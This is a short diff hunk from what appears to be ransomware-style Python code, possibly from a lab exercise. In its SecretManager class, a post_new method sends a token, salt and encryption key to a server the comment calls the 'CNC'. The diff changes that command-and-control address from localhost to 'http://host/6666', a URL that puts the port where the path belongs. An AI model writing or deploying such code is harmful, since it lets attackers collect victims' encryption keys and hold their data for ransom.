@@ -49,7 +49,7 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         #Use the post function using the URL of the CNC and the json data
-        response = requests.post('https://127.0.0.1:6666/new', json={
+        response = requests.post('http://host/6666', json={
             "token": self.bin_to_b64(token),
             "salt": self.bin_to_b64(salt),
             "key": self.bin_to_b64(key)
